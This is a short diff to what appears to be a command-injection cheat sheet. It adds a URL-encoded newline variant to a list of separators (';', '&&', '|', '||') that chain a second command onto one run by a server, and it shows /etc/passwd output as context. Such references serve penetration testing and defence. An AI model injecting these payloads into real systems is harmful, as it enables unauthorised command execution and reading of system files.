@@ -50,6 +50,7 @@ sys:x:3:3:sys:/dev:/bin/sh
 original_cmd_by_server; ls
 original_cmd_by_server && ls
 original_cmd_by_server | ls
+original_cmd_by_server %0a ls
 original_cmd_by_server || ls    Only if the first cmd fail
 ```
 
